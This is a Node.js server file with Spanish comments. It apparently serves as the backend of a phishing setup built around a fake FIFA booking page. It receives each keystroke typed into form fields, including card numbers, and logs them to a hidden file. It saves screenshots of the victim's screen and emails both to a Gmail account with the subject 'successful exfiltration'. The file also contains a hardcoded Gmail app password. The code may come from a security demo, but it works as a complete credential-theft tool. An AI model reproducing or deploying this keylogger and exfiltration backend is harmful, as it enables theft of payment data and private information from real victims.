const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

const SERVER_IP = '192.168.1.109'

// CONFIGURACIÓN DE ALMACENAMIENTO
const LOG_FILE = path.join(__dirname, '.logs_db.txt');
const SCREENSHOTS_DIR = path.join(__dirname, 'capturas');
const nodemailer = require('nodemailer');

// Crear carpeta de capturas si no existe
if (!fs.existsSync(SCREENSHOTS_DIR)) {
    fs.mkdirSync(SCREENSHOTS_DIR);
}

// MIDDLEWARE
app.use(cors());
// Aumentamos el límite a 10mb para soportar las capturas de pantalla en Base64
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));
app.use('/src', express.static('src'));  // Servir archivos desde la carpeta src/

// 1. RUTA PARA EL KEYLOGGER (Texto en tiempo real)
app.post('/captura', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toLocaleString();

    // Formateamos la entrada: [Fecha] Campo: card-number | Valor: 4566...
    const logEntry = `[${timestamp}] Campo: ${data.f} | Valor: ${data.v}\n`;

    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error("❌ Error al guardar log de texto:", err);
            return res.status(500).send();
        }
        res.status(200).json({ status: "ok" });
    });

    // Feedback en consola para el "atacante"
    console.log(`⌨️  Capturado: ${data.f} => ${data.v}`);
});

// 2. RUTA PARA SCREENSHOTS (Imágenes del DOM)
app.post('/upload-screenshot', (req, res) => {
    const { image, user, timestamp } = req.body;

    // Limpiamos el prefijo Base64 para convertirlo en buffer de imagen
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const safeUser = (user || 'desconocido').replace(/\s/g, '_');
    const fileName = `snap_${safeUser}_${timestamp}.png`;

    fs.writeFile(path.join(SCREENSHOTS_DIR, fileName), base64Data, 'base64', (err) => {
        if (err) {
            console.error("❌ Error al guardar captura de pantalla:", err);
            return res.status(500).send();
        }
        console.log(`📸 Captura visual guardada: ${fileName}`);
        res.status(200).json({ status: "success" });
    });
});

// 1. Configurar el transportador (Usa una "Contraseña de aplicación" de Google)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'ismaelbm1809@gmail.com',
        pass: 'ahhz nlyx uufw qham '
    }
});

// 2. Ruta para procesar el "Finalizar Reserva" y enviar el correo
app.post('/finalizar-y-enviar', async (req, res) => {
    const { user } = req.body;
    const safeUser = (user || 'desconocido').replace(/\s/g, '_');

    // Buscamos la última captura generada para este usuario
    const files = fs.readdirSync(SCREENSHOTS_DIR);
    const userFiles = files.filter(f => f.includes(safeUser)).sort().reverse();
    const lastScreenshot = userFiles.length > 0 ? path.join(SCREENSHOTS_DIR, userFiles[0]) : null;

    const mailOptions = {
        from: 'Servidor FIFA <ismaelbm1809@gmail.com>',
        to: 'ismaelbm1809@gmail.com',
        subject: `⚠️ EXFILTRACIÓN EXITOSA: ${user}`,
        text: `Se ha completado una reserva falsa.\n\nRevisa los archivos adjuntos para ver el log de teclas y la captura de pantalla.`,
        attachments: [
            { filename: '.logs_db.txt', path: LOG_FILE },
            ...(lastScreenshot ? [{ filename: 'captura.jpg', path: lastScreenshot }] : [])
        ]
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log(`📧 Correo enviado con éxito para el usuario: ${user}`);
        res.status(200).json({ status: "sent" });
    } catch (error) {
        console.error("❌ Error enviando correo:", error);
        res.status(500).send();
    }
});

const HOST = '0.0.0.0'; // Esto permite conexiones externas (celular)

// INICIO DEL SERVIDOR
app.listen(PORT, HOST, () => {
    console.log(`=========================================`);
    console.log(`   CENTRO DE CONTROL - CIBERSEGURIDAD    `);
    console.log(`=========================================`);
    console.log(`📡 Servidor accesible en: http://${SERVER_IP}:${PORT}`);
    console.log(`📂 Logs de texto: ${LOG_FILE}`);
    console.log(`🖼️  Capturas en: ${SCREENSHOTS_DIR}`);
    console.log(`-----------------------------------------`);
    console.log(`Esperando actividad de la víctima...`);
});